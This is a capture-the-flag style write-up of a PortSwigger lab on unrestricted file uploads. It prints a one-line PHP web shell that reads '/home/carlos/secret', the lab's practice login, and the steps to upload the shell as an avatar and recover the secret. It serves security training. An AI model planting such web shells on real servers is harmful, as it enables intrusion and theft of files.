# Lab Writeup: Remote code execution via web shell upload

URL: https://portswigger.net/web-security/learning-paths/file-upload-vulnerabilities/exploiting-unrestricted-file-uploads-to-deploy-a-web-shell/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload

## Description

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

1. Upload using `wiener:peter`
2. Create the following PHP payload:

   ```php
    <?php echo file_get_contents('/home/carlos/secret') ?>
   ```

3. Upload as avatar
4. Open the uploaded image in new tab, here's the output `IoGP8TsO6JqD8xEkh1jGqeyUKKLqD4LP`
5. Submit and the challenge should be solved:

   ![rce-webshell-upload](/assets/rce-webshell-upload.png)
